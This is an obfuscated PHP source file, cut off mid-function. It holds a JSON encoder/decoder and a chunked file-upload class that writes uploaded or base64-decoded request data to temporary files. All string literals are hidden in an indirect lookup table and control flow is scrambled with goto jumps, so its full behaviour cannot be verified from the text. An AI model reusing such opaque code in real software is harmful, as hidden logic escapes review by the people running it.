<?php
 goto E¬ç‡˜İˆ¶; bÒÂâ¯º‘©: class Services_JSON { function __construct($e„Ğ¬«‰¨ê = 0) { $this->use = $e„Ğ¬«‰¨ê; } function utf162utf8($fø’Ö¼‘„Ã) { $a¡²’šÀ¼Ú =& $_SERVER[¼]; if (function_exists($a¡²’šÀ¼Ú[68])) { return mb_convert_encoding($fø’Ö¼‘„Ã, $a¡²’šÀ¼Ú[1553], $a¡²’šÀ¼Ú[1902]); } $Dù«ñ¬§Ü = ord($fø’Ö¼‘„Ã[0]) << 8 | ord($fø’Ö¼‘„Ã[1]); switch (!0) { case (127 & $Dù«ñ¬§Ü) == $Dù«ñ¬§Ü: return chr(127 & $Dù«ñ¬§Ü); case (2047 & $Dù«ñ¬§Ü) == $Dù«ñ¬§Ü: return chr(192 | $Dù«ñ¬§Ü >> 6 & 31) . chr(128 | $Dù«ñ¬§Ü & 63); case (65535 & $Dù«ñ¬§Ü) == $Dù«ñ¬§Ü: return chr(224 | $Dù«ñ¬§Ü >> 12 & 15) . chr(128 | $Dù«ñ¬§Ü >> 6 & 63) . chr(128 | $Dù«ñ¬§Ü & 63); } return $a¡²’šÀ¼Ú[33]; } function utf82utf16($E½ì«‚) { $eöÖƒè¿ÇÂ =& $_SERVER[¼]; if (function_exists($eöÖƒè¿ÇÂ[68])) { return mb_convert_encoding($E½ì«‚, $eöÖƒè¿ÇÂ[1902], $eöÖƒè¿ÇÂ[1553]); } switch (strlen($E½ì«‚)) { case 1: return $E½ì«‚; case 2: return chr(7 & ord($E½ì«‚[0]) >> 2) . chr(192 & ord($E½ì«‚[0]) << 6 | 63 & ord($E½ì«‚[1])); case 3: return chr(240 & ord($E½ì«‚[0]) << 4 | 15 & ord($E½ì«‚[1]) >> 2) . chr(192 & ord($E½ì«‚[1]) << 6 | 127 & ord($E½ì«‚[2])); } return $eöÖƒè¿ÇÂ[33]; } function encode($C¢·ë½¼­) { $fƒã¶Ô¦ª¹ =& $_SERVER[¼]; switch (gettype($C¢·ë½¼­)) { case $fƒã¶Ô¦ª¹[1564]: return $C¢·ë½¼­ ? $fƒã¶Ô¦ª¹[1563] : $fƒã¶Ô¦ª¹[1565]; case $fƒã¶Ô¦ª¹[1903]: return $fƒã¶Ô¦ª¹[101]; case $fƒã¶Ô¦ª¹[300]: return (int) $C¢·ë½¼­; case $fƒã¶Ô¦ª¹[275]: case $fƒã¶Ô¦ª¹[274]: return (double) $C¢·ë½¼­; case $fƒã¶Ô¦ª¹[309]: $dìÙÏÄø„ = $fƒã¶Ô¦ª¹[33]; $aãŒ¾¥¿Ö’ = strlen($C¢·ë½¼­); for ($FŞŞëÅ×ì = 0; $FŞŞëÅ×ì < $aãŒ¾¥¿Ö’; ++$FŞŞëÅ×ì) { $f¯³¯ò¹¼ù = ord($C¢·ë½¼­[$FŞŞëÅ×ì]); switch (!0) { case $f¯³¯ò¹¼ù == 8: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[1904]; break; case $f¯³¯ò¹¼ù == 9: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[1540]; break; case $f¯³¯ò¹¼ù == 10: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[1538]; break; case $f¯³¯ò¹¼ù == 12: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[1905]; break; case $f¯³¯ò¹¼ù == 13: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[1539]; break; case $f¯³¯ò¹¼ù == 34: case $f¯³¯ò¹¼ù == 47: case $f¯³¯ò¹¼ù == 92: $dìÙÏÄø„ .= $fƒã¶Ô¦ª¹[95] . $C¢·ë½¼­[$FŞŞëÅ×ì]; break; case $f¯³¯ò¹¼ù >= 32 && $f¯³¯ò¹¼ù <= 127: $dìÙÏÄø„ .= $C¢·ë½¼­[$FŞŞëÅ×ì]; break; case ($f¯³¯ò¹¼ù & 224) == 192: $cìÎ½¨éµŞ = pack($fƒã¶Ô¦ª¹[1906], $f¯³¯ò¹¼ù, ord($C¢·ë½¼­[$FŞŞëÅ×ì + 1])); $FŞŞëÅ×ì += 1; $B™˜Šçˆå¥ = $this->utf82utf16($cìÎ½¨éµŞ); $dìÙÏÄø„ .= sprintf($fƒã¶Ô¦ª¹[1907], bin2hex($B™˜Šçˆå¥)); break; case ($f¯³¯ò¹¼ù & 240) == 224: $cìÎ½¨éµŞ = pack($fƒã¶Ô¦ª¹[1906], $f¯³¯ò¹¼ù, ord($C¢·ë½¼­[$FŞŞëÅ×ì + 1]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 2])); $FŞŞëÅ×ì += 2; $B™˜Šçˆå¥ = $this->utf82utf16($cìÎ½¨éµŞ); $dìÙÏÄø„ .= sprintf($fƒã¶Ô¦ª¹[1907], bin2hex($B™˜Šçˆå¥)); break; case ($f¯³¯ò¹¼ù & 248) == 240: $cìÎ½¨éµŞ = pack($fƒã¶Ô¦ª¹[1906], $f¯³¯ò¹¼ù, ord($C¢·ë½¼­[$FŞŞëÅ×ì + 1]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 2]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 3])); $FŞŞëÅ×ì += 3; $B™˜Šçˆå¥ = $this->utf82utf16($cìÎ½¨éµŞ); $dìÙÏÄø„ .= sprintf($fƒã¶Ô¦ª¹[1907], bin2hex($B™˜Šçˆå¥)); break; case ($f¯³¯ò¹¼ù & 252) == 248: $cìÎ½¨éµŞ = pack($fƒã¶Ô¦ª¹[1906], $f¯³¯ò¹¼ù, ord($C¢·ë½¼­[$FŞŞëÅ×ì + 1]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 2]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 3]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 4])); $FŞŞëÅ×ì += 4; $B™˜Šçˆå¥ = $this->utf82utf16($cìÎ½¨éµŞ); $dìÙÏÄø„ .= sprintf($fƒã¶Ô¦ª¹[1907], bin2hex($B™˜Šçˆå¥)); break; case ($f¯³¯ò¹¼ù & 254) == 252: $cìÎ½¨éµŞ = pack($fƒã¶Ô¦ª¹[1906], $f¯³¯ò¹¼ù, ord($C¢·ë½¼­[$FŞŞëÅ×ì + 1]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 2]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 3]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 4]), ord($C¢·ë½¼­[$FŞŞëÅ×ì + 5])); $FŞŞëÅ×ì += 5; $B™˜Šçˆå¥ = $this->utf82utf16($cìÎ½¨éµŞ); $dìÙÏÄø„ .= sprintf($fƒã¶Ô¦ª¹[1907], bin2hex($B™˜Šçˆå¥)); break; } } return $fƒã¶Ô¦ª¹[113] . $dìÙÏÄø„ . $fƒã¶Ô¦ª¹[113]; case $fƒã¶Ô¦ª¹[1908]: if (is_array($C¢·ë½¼­) && count($C¢·ë½¼­) && array_keys($C¢·ë½¼­) !== range(0, sizeof($C¢·ë½¼­) - 1)) { $eä÷·…ëØ’ = array_map(array($this, $fƒã¶Ô¦ª¹[1909]), array_keys($C¢·ë½¼­), array_values($C¢·ë½¼­)); foreach ($eä÷·…ëØ’ as $F®ÉËÇ÷£ğ) { if (Services_JSON::isError($F®ÉËÇ÷£ğ)) { return $F®ÉËÇ÷£ğ; } } return $fƒã¶Ô¦ª¹[1061] . join($fƒã¶Ô¦ª¹[47], $eä÷·…ëØ’) . $fƒã¶Ô¦ª¹[312]; } $c«ğ¢·¢ÌÒ = array_map(array($this, $fƒã¶Ô¦ª¹[1910]), $C¢·ë½¼­); foreach ($c«ğ¢·¢ÌÒ as $a°Á…»Ó÷) { if (Services_JSON::isError($a°Á…»Ó÷)) { return $a°Á…»Ó÷; } } return $fƒã¶Ô¦ª¹[154] . join($fƒã¶Ô¦ª¹[47], $c«ğ¢·¢ÌÒ) . $fƒã¶Ô¦ª¹[472]; case $fƒã¶Ô¦ª¹[1911]: $aÜÙš„Ê = get_object_vars($C¢·ë½¼­); $eä÷·…ëØ’ = array_map(array($this, $fƒã¶Ô¦ª¹[1909]), array_keys($aÜÙš„Ê), array_values($aÜÙš„Ê)); foreach ($eä÷·…ëØ’ as $F®ÉËÇ÷£ğ) { if (Services_JSON::isError($F®ÉËÇ÷£ğ)) { return $F®ÉËÇ÷£ğ; } } return $fƒã¶Ô¦ª¹[1061] . join($fƒã¶Ô¦ª¹[47], $eä÷·…ëØ’) . $fƒã¶Ô¦ª¹[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $fƒã¶Ô¦ª¹[101] : new Services_JSON_Error(gettype($C¢·ë½¼­) . $fƒã¶Ô¦ª¹[1912]); } } function name_value($C‡™™‘ùº, $bğáÒí×ÄŞ) { $Bö¿é¾òØÁ = $this->encode($bğáÒí×ÄŞ); if (Services_JSON::isError($Bö¿é¾òØÁ)) { return $Bö¿é¾òØÁ; } return $this->encode(strval($C‡™™‘ùº)) . $_SERVER[¼][4] . $Bö¿é¾òØÁ; } function reduce_string($fÉ•½Á°ÓÛ) { $C‹Ò•ÆÕÉ£ =& $_SERVER[¼]; $fÉ•½Á°ÓÛ = preg_replace(array($C‹Ò•ÆÕÉ£[1913], $C‹Ò•ÆÕÉ£[1914], $C‹Ò•ÆÕÉ£[1915]), $C‹Ò•ÆÕÉ£[33], $fÉ•½Á°ÓÛ); return trim($fÉ•½Á°ÓÛ); } function decode($f‰³¨åçÄ) { $bù…©ÂÊŒ =& $_SERVER[¼]; $f‰³¨åçÄ = $this->reduce_string($f‰³¨åçÄ); switch (strtolower($f‰³¨åçÄ)) { case $bù…©ÂÊŒ[1563]: return !0; case $bù…©ÂÊŒ[1565]: return !1; case $bù…©ÂÊŒ[101]: return null; default: $fÂãáŸ—ëß = array(); if (is_numeric($f‰³¨åçÄ)) { return (double) $f‰³¨åçÄ == (int) $f‰³¨åçÄ ? (int) $f‰³¨åçÄ : (double) $f‰³¨åçÄ; } elseif (preg_match($bù…©ÂÊŒ[1916], $f‰³¨åçÄ, $fÂãáŸ—ëß) && $fÂãáŸ—ëß[1] == $fÂãáŸ—ëß[2]) { $eÖØâêà‘ = substr($f‰³¨åçÄ, 0, 1); $e„âˆœº¸ = substr($f‰³¨åçÄ, 1, -1); $eõêÊÑÅ©Š = $bù…©ÂÊŒ[33]; $EøŸÜÓÖõÆ = strlen($e„âˆœº¸); for ($C©®¼ß­ŠÒ = 0; $C©®¼ß­ŠÒ < $EøŸÜÓÖõÆ; ++$C©®¼ß­ŠÒ) { $E¼âÛœˆˆ· = substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 2); $eŠÍÚğ‘Ï· = ord($e„âˆœº¸[$C©®¼ß­ŠÒ]); switch (!0) { case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1904]: $eõêÊÑÅ©Š .= chr(8); ++$C©®¼ß­ŠÒ; break; case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1540]: $eõêÊÑÅ©Š .= chr(9); ++$C©®¼ß­ŠÒ; break; case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1538]: $eõêÊÑÅ©Š .= chr(10); ++$C©®¼ß­ŠÒ; break; case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1905]: $eõêÊÑÅ©Š .= chr(12); ++$C©®¼ß­ŠÒ; break; case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1539]: $eõêÊÑÅ©Š .= chr(13); ++$C©®¼ß­ŠÒ; break; case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1324]: case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1917]: case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1533]: case $E¼âÛœˆˆ· == $bù…©ÂÊŒ[1535]: if ($eÖØâêà‘ == $bù…©ÂÊŒ[113] && $E¼âÛœˆˆ· != $bù…©ÂÊŒ[1917] || $eÖØâêà‘ == $bù…©ÂÊŒ[55] && $E¼âÛœˆˆ· != $bù…©ÂÊŒ[1324]) { $eõêÊÑÅ©Š .= $e„âˆœº¸[++$C©®¼ß­ŠÒ]; } break; case preg_match($bù…©ÂÊŒ[1918], substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 6)): $bÁØ–¼ÌÈ = chr(hexdec(substr($e„âˆœº¸, $C©®¼ß­ŠÒ + 2, 2))) . chr(hexdec(substr($e„âˆœº¸, $C©®¼ß­ŠÒ + 4, 2))); $eõêÊÑÅ©Š .= $this->utf162utf8($bÁØ–¼ÌÈ); $C©®¼ß­ŠÒ += 5; break; case $eŠÍÚğ‘Ï· >= 32 && $eŠÍÚğ‘Ï· <= 127: $eõêÊÑÅ©Š .= $e„âˆœº¸[$C©®¼ß­ŠÒ]; break; case ($eŠÍÚğ‘Ï· & 224) == 192: $eõêÊÑÅ©Š .= substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 2); ++$C©®¼ß­ŠÒ; break; case ($eŠÍÚğ‘Ï· & 240) == 224: $eõêÊÑÅ©Š .= substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 3); $C©®¼ß­ŠÒ += 2; break; case ($eŠÍÚğ‘Ï· & 248) == 240: $eõêÊÑÅ©Š .= substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 4); $C©®¼ß­ŠÒ += 3; break; case ($eŠÍÚğ‘Ï· & 252) == 248: $eõêÊÑÅ©Š .= substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 5); $C©®¼ß­ŠÒ += 4; break; case ($eŠÍÚğ‘Ï· & 254) == 252: $eõêÊÑÅ©Š .= substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 6); $C©®¼ß­ŠÒ += 5; break; } } return $eõêÊÑÅ©Š; } elseif (preg_match($bù…©ÂÊŒ[1919], $f‰³¨åçÄ) || preg_match($bù…©ÂÊŒ[1920], $f‰³¨åçÄ)) { goto C’³Ï¾ÇÃÁ; C’³Ï¾ÇÃÁ: if ($f‰³¨åçÄ[0] == $bù…©ÂÊŒ[154]) { $dö±Ò²ÊÃš = array(SERVICES_JSON_IN_ARR); $Fô§É¹Åõ÷ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dö±Ò²ÊÃš = array(SERVICES_JSON_IN_OBJ); $Cµ†ÈÌê–ç = array(); } else { $dö±Ò²ÊÃš = array(SERVICES_JSON_IN_OBJ); $Cµ†ÈÌê–ç = new stdClass(); } } array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_SLICE, $bù…©ÂÊŒ[260] => 0, $bù…©ÂÊŒ[1922] => !1)); $e„âˆœº¸ = substr($f‰³¨åçÄ, 1, -1); goto E“‚í±ÚÔ’; E“‚í±ÚÔ’: $e„âˆœº¸ = $this->reduce_string($e„âˆœº¸); if ($e„âˆœº¸ == $bù…©ÂÊŒ[33]) { if (reset($dö±Ò²ÊÃš) == SERVICES_JSON_IN_ARR) { return $Fô§É¹Åõ÷; } else { return $Cµ†ÈÌê–ç; } } $EøŸÜÓÖõÆ = strlen($e„âˆœº¸); goto A½Œ‘Û…ä; A½Œ‘Û…ä: for ($C©®¼ß­ŠÒ = 0; $C©®¼ß­ŠÒ <= $EøŸÜÓÖõÆ; ++$C©®¼ß­ŠÒ) { $E¥ËÄŠ¦Ãî = end($dö±Ò²ÊÃš); $E¼âÛœˆˆ· = substr($e„âˆœº¸, $C©®¼ß­ŠÒ, 2); if ($C©®¼ß­ŠÒ == $EøŸÜÓÖõÆ || $e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[47] && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] == SERVICES_JSON_SLICE) { $CŸˆ¶ˆøÈˆ = substr($e„âˆœº¸, $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[260]], $C©®¼ß­ŠÒ - $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[260]]); array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_SLICE, $bù…©ÂÊŒ[260] => $C©®¼ß­ŠÒ + 1, $bù…©ÂÊŒ[1922] => !1)); if (reset($dö±Ò²ÊÃš) == SERVICES_JSON_IN_ARR) { array_push($Fô§É¹Åõ÷, $this->decode($CŸˆ¶ˆøÈˆ)); } elseif (reset($dö±Ò²ÊÃš) == SERVICES_JSON_IN_OBJ) { $aÂ»âôß = array(); if (preg_match($bù…©ÂÊŒ[1923], $CŸˆ¶ˆøÈˆ, $aÂ»âôß)) { $bœÍÎìãŠ = $this->decode($aÂ»âôß[1]); $bùĞ¿±¹Öœ = $this->decode($aÂ»âôß[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cµ†ÈÌê–ç[$bœÍÎìãŠ] = $bùĞ¿±¹Öœ; } else { $Cµ†ÈÌê–ç->{$bœÍÎìãŠ} = $bùĞ¿±¹Öœ; } } elseif (preg_match($bù…©ÂÊŒ[1924], $CŸˆ¶ˆøÈˆ, $aÂ»âôß)) { $bœÍÎìãŠ = $aÂ»âôß[1]; $bùĞ¿±¹Öœ = $this->decode($aÂ»âôß[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Cµ†ÈÌê–ç[$bœÍÎìãŠ] = $bùĞ¿±¹Öœ; } else { $Cµ†ÈÌê–ç->{$bœÍÎìãŠ} = $bùĞ¿±¹Öœ; } } } } elseif (($e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[113] || $e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[55]) && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] != SERVICES_JSON_IN_STR) { array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_IN_STR, $bù…©ÂÊŒ[260] => $C©®¼ß­ŠÒ, $bù…©ÂÊŒ[1922] => $e„âˆœº¸[$C©®¼ß­ŠÒ])); } elseif ($e„âˆœº¸[$C©®¼ß­ŠÒ] == $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1922]] && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] == SERVICES_JSON_IN_STR && (strlen(substr($e„âˆœº¸, 0, $C©®¼ß­ŠÒ)) - strlen(rtrim(substr($e„âˆœº¸, 0, $C©®¼ß­ŠÒ), $bù…©ÂÊŒ[95]))) % 2 != 1) { array_pop($dö±Ò²ÊÃš); } elseif ($e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[154] && in_array($E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_IN_ARR, $bù…©ÂÊŒ[260] => $C©®¼ß­ŠÒ, $bù…©ÂÊŒ[1922] => !1)); } elseif ($e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[472] && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] == SERVICES_JSON_IN_ARR) { array_pop($dö±Ò²ÊÃš); } elseif ($e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[1061] && in_array($E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_IN_OBJ, $bù…©ÂÊŒ[260] => $C©®¼ß­ŠÒ, $bù…©ÂÊŒ[1922] => !1)); } elseif ($e„âˆœº¸[$C©®¼ß­ŠÒ] == $bù…©ÂÊŒ[312] && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] == SERVICES_JSON_IN_OBJ) { array_pop($dö±Ò²ÊÃš); } elseif ($E¼âÛœˆˆ· == $bù…©ÂÊŒ[1925] && in_array($E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($dö±Ò²ÊÃš, array($bù…©ÂÊŒ[1921] => SERVICES_JSON_IN_CMT, $bù…©ÂÊŒ[260] => $C©®¼ß­ŠÒ, $bù…©ÂÊŒ[1922] => !1)); $C©®¼ß­ŠÒ++; } elseif ($E¼âÛœˆˆ· == $bù…©ÂÊŒ[1926] && $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[1921]] == SERVICES_JSON_IN_CMT) { array_pop($dö±Ò²ÊÃš); $C©®¼ß­ŠÒ++; for ($aˆÀŒÌ¤² = $E¥ËÄŠ¦Ãî[$bù…©ÂÊŒ[260]]; $aˆÀŒÌ¤² <= $C©®¼ß­ŠÒ; ++$aˆÀŒÌ¤²) { $e„âˆœº¸ = substr_replace($e„âˆœº¸, $bù…©ÂÊŒ[50], $aˆÀŒÌ¤², 1); } } } if (reset($dö±Ò²ÊÃš) == SERVICES_JSON_IN_ARR) { return $Fô§É¹Åõ÷; } elseif (reset($dö±Ò²ÊÃš) == SERVICES_JSON_IN_OBJ) { return $Cµ†ÈÌê–ç; } goto a­¿‹º†„Ÿ; a­¿‹º†„Ÿ: } } } function isError($B˜ŒçŞŸ—î, $CÀôÍŠÅãÎ = null) { $D´ë²öÛ©ó =& $_SERVER[¼]; if (class_exists($D´ë²öÛ©ó[1927])) { return PEAR::isError($B˜ŒçŞŸ—î, $CÀôÍŠÅãÎ); } elseif (is_object($B˜ŒçŞŸ—î) && (get_class($B˜ŒçŞŸ—î) == $D´ë²öÛ©ó[1928] || is_subclass_of($B˜ŒçŞŸ—î, $D´ë²öÛ©ó[1928]))) { return !0; } return !1; } } if (class_exists($_SERVER[¼][1929])) { class Services_JSON_Error extends PEAR_Error { function __construct($DŠ¶àÏ–ã™ = "\x75\x6e\153\x6e\157\167\x6e\40\145\162\x72\x6f\x72", $C–é’¤åÆ³ = null, $Aƒ¼…ÎÊ›Š = null, $f»‰í¹øÜÃ = null, $a¤³ôŞË· = null) { parent::PEAR_Error($DŠ¶àÏ–ã™, $C–é’¤åÆ³, $Aƒ¼…ÎÊ›Š, $f»‰í¹øÜÃ, $a¤³ôŞË·); } } } else { class Services_JSON_Error { function __construct($AÕØ«†Ó£‰ = "\x75\156\153\x6e\157\167\156\40\x65\x72\x72\157\x72", $e“‚´Ü‚÷ä = null, $E±¹¬ĞĞÈ = null, $bÑ½÷ã·³ = null, $eŒÂä¿„©Ë = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto e‹õÇŠ²¿ä; dé¦­ù–Êô: $this->checkSize(); $this->tempPathInit(); goto FñéòÂòŞ–; e‹õÇŠ²¿ä: $F‚×¢¬àÑó =& $_SERVER[¼]; global $in; $this->in =& $in; goto FŸÄ°ò¢á; FŸÄ°ò¢á: if (!empty($_FILES)) { $aç°µê£µ = $_FILES[$F‚×¢¬àÑó[164]]; $this->uploadFile = $aç°µê£µ[$F‚×¢¬àÑó[1930]]; if (!$this->uploadFile && $aç°µê£µ[$F‚×¢¬àÑó[1204]] > 0) { show_json($this->errorInfo($aç°µê£µ[$F‚×¢¬àÑó[1204]]), !1); } } else { if (isset($in[$F‚×¢¬àÑó[383]])) { $this->uploadFile = isset($in[$F‚×¢¬àÑó[1931]]) ? $F‚×¢¬àÑó[1932] : $F‚×¢¬àÑó[1777]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto dé¦­ù–Êô; FñéòÂòŞ–: } public function upload() { goto eâíÁ›‰Ó; cÒìÎÚ™–®: @unlink($C§ËÎëßÈ¥); if (!$d£©­¶ùš¦) { $this->showJson($BÔåä—Ïˆœ[1941] . $DÓÕÓïğË, !1); } $b¾êÇ¦×Ä[$BÔåä—Ïˆœ[1942]] = $Aç‘Û‘‚; goto AˆÏöàš­È; AˆÏöàš­È: $b¾êÇ¦×Ä[$BÔåä—Ïˆœ[1943]][$BÔåä—Ïˆœ[1944] . $DÓÕÓïğË] = array($BÔåä—Ïˆœ[1945] => $DË†Ó¡Àô’, $BÔåä—Ïˆœ[1029] => $DÓÕÓïğË, $BÔåä—Ïˆœ[77] => $eöÒÉ²°ºä, $BÔåä—Ïˆœ[161] => $cÉ ‚ÍåâÔ); $this->statusSet($b¾êÇ¦×Ä); if (count($b¾êÇ¦×Ä[$BÔåä—Ïˆœ[1943]]) != $b¾êÇ¦×Ä[$BÔåä—Ïˆœ[1942]]) { $this->showJson($BÔåä—Ïˆœ[1946] . $DÓÕÓïğË, !0); } goto bæï—°õîê; bæï—°õîê: ignore_timeout(); if (!$this->checkChunkHash($b¾êÇ¦×Ä)) { $this->showJson($BÔåä—Ïˆœ[1947], !1); } $this->statusSet(!1); goto DĞã¿ŸˆŸ¥; cô¹øó¤: $bñ›ñ‹–¢ = $this->tempFile . $BÔåä—Ïˆœ[1935] . $DÓÕÓïğË; $eöÒÉ²°ºä = isset($this->in[$BÔåä—Ïˆœ[516]]) ? intval($this->in[$BÔåä—Ïˆœ[516]]) : 0; $b˜°“­ßßä = isset($this->in[$BÔåä—Ïˆœ[1936]]) ? intval($this->in[$BÔåä—Ïˆœ[1936]]) : 0; goto D§ÕÃˆÒò¤; f˜Ä¬ö‹ë°: $DË†Ó¡Àô’ = $DÓÕÓïğË * $b˜°“­ßßä; $D½ïğÍá®Ë = @fopen($this->tempFile, $BÔåä—Ïˆœ[1940]); fseek($D½ïğÍá®Ë, $DË†Ó¡Àô’); goto e¦¡œÅĞ; D§ÕÃˆÒò¤: if ($Aç‘Û‘‚ > 1 && $b˜°“­ßßä <= 0) { show_json($BÔåä—Ïˆœ[1937], !1); } if ($b˜°“­ßßä > $eöÒÉ²°ºä) { $Aç‘Û‘‚ = 1; } if ($Aç‘Û‘‚ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Aİ¨ÅÕ®ª‰; Aİ¨ÅÕ®ª‰: CacheLock::lock($this->tempFile, 20); $b¾êÇ¦×Ä = $this->statusGet(); $this->initFileTemp(); goto dçˆã²¬ê; DĞã¿ŸˆŸ¥: CacheLock::unlock($this->tempFile); return $this->tempFile; goto fê“ß“¸áÑ; e¦¡œÅĞ: $d£©­¶ùš¦ = $this->writeTo($C§ËÎëßÈ¥, $D½ïğÍá®Ë, $this->tempFile); $cÉ ‚ÍåâÔ = IO::hashSimple($C§ËÎëßÈ¥); $eöÒÉ²°ºä = IO::size($C§ËÎëßÈ¥); goto cÒìÎÚ™–®; dçˆã²¬ê: $C§ËÎëßÈ¥ = $this->moveUploadedFile($bñ›ñ‹–¢); if ($eöÒÉ²°ºä > 0 && filesize($C§ËÎëßÈ¥) == 0) { $this->showJson($BÔåä—Ïˆœ[1938], !1); } if (!$C§ËÎëßÈ¥) { $this->showJson(LNG($BÔåä—Ïˆœ[1939]), !1); } goto f˜Ä¬ö‹ë°; eâíÁ›‰Ó: $BÔåä—Ïˆœ =& $_SERVER[¼]; $DÓÕÓïğË = isset($this->in[$BÔåä—Ïˆœ[1933]]) ? intval($this->in[$BÔåä—Ïˆœ[1933]]) : 0; $Aç‘Û‘‚ = isset($this->in[$BÔåä—Ïˆœ[1934]]) ? intval($this->in[$BÔåä—Ïˆœ[1934]]) : 1; goto cô¹øó¤; fê“ß“¸áÑ: } private function checkSize() { $Aˆôµíè† =& $_SERVER[¼]; if (phpBuild64() || $this->in[$Aˆôµíè†[77]] < PHP_INT_MAX) { return; } show_json(LNG($Aˆôµíè†[1948]), !1); } private function showJson($A„ˆ”ç‚÷×, $Dºøì¼…“’) { CacheLock::unlock($this->tempFile); if (!$Dºøì¼…“’) { return show_json($A„ˆ”ç‚÷×, $Dºøì¼…“’); } show_json($A„ˆ”ç‚÷×, $Dºøì¼…“’); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Fîæ†’…Š; A‡¬–ãÍ: touch($D‰ÚÒ´¢À . $E¹ôŠŞ¬™Í[1949]); $FÆğ‹ÃÔà = isset($this->in[$E¹ôŠŞ¬™Í[1950]]) ? $this->in[$E¹ôŠŞ¬™Í[1950]] : !1; if (strlen($FÆğ‹ÃÔà) < 30) { $FÆğ‹ÃÔà = md5(USER_ID . $this->in[$E¹ôŠŞ¬™Í[75]] . $this->fileName . $this->in[$E¹ôŠŞ¬™Í[77]]); } goto E´®‡ÆøåÆ; Fîæ†’…Š: $E¹ôŠŞ¬™Í =& $_SERVER[¼]; $D‰ÚÒ´¢À = TEMP_FILES; @mk_dir($D‰ÚÒ´¢À); goto A‡¬–ãÍ; E´®‡ÆøåÆ: $this->tempFile = $D‰ÚÒ´¢À . $E¹ôŠŞ¬™Í[1951] . md5($FÆğ‹ÃÔà . $this->in[$E¹ôŠŞ¬™Í[1495]]); goto a¦øé¹… µ; a¦øé¹… µ: } private function moveUploadedFile($Fªİ³÷®‡) { $bÉ¼ªÂ¡– =& $_SERVER[¼]; $F»åä±’ = $this->uploadFile; if ($F»åä±’ == $bÉ¼ªÂ¡–[1952]) { @file_put_contents($Fªİ³÷®‡, base64_decode($_REQUEST[$bÉ¼ªÂ¡–[1953]])); } else { if ($F»åä±’ == $bÉ¼ªÂ¡–[1777]) { $AçÙ¥µÉ‹ = @fopen($Fªİ³÷®‡, $bÉ¼ªÂ¡–[1484]); $this->writeTo($F»åä±’, $AçÙ¥µÉ‹, $Fªİ³÷®‡); } else { if (!move_uploaded_file($F»åä±’, $Fªİ³÷®‡)) { return !1; } } } return $Fªİ³÷®‡; } private function writeTo($f‡‚‘ÂÊš˜, $aœ«‚‘¹, 